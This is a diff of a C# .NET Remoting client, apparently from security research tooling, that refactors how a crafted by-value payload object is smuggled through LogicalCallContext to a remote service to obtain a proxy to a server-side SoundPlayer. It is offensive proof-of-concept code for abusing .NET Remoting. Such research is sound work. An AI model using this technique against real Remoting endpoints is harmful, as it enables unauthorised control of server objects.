@@ -11,6 +11,7 @@ using System.Runtime.Serialization.Formatters.Binary;
 using System.Runtime.Serialization;
 using System.Reflection;
 using CodeWhite.Remoting.Shared;
+using System.Collections.Generic;
 
 namespace CodeWhite.Remoting.RemotingClient_MBVO
 {
@@ -41,16 +42,19 @@ namespace CodeWhite.Remoting.RemotingClient_MBVO
             ChannelServices.RegisterChannel(clientChannel, false);
 
             // send payload object by value
+            const string key = "MBRO";
             object payload = MarshalByValueObject.Create(new SoundPlayer());
-            IMethodReturnMessage methodReturnMessage = Utils.InvokeMethodCall(objUrl, payload);
+            var logicalCallContextData = new Dictionary<string, object>()
+            {
+                { key, payload }
+            };
+            IMethodReturnMessage methodReturnMessage = Utils.CallRemoteToStringMethod(objUrl, logicalCallContextData);
 
             // obtain proxy from `LogicalCallContext`
-            var mbro = (MarshalByRefObject)methodReturnMessage.LogicalCallContext.GetData("MBRO");
+            var mbro = (MarshalByRefObject)methodReturnMessage.LogicalCallContext.GetData(key);
 
             // print info
-            Console.WriteLine($"[*] Obtained MBRO type: {mbro.GetType()}");
-            Console.WriteLine($"[*] IsTransparentProxy: {RemotingServices.IsTransparentProxy(mbro)}");
-            Console.WriteLine($"[*] GetObjectUri: {RemotingServices.GetObjectUri(mbro)}");
+            Utils.PrintInfo(mbro);
 
             // use remote `SoundPlayer`
             var soundPlayerProxy = (SoundPlayer)mbro;
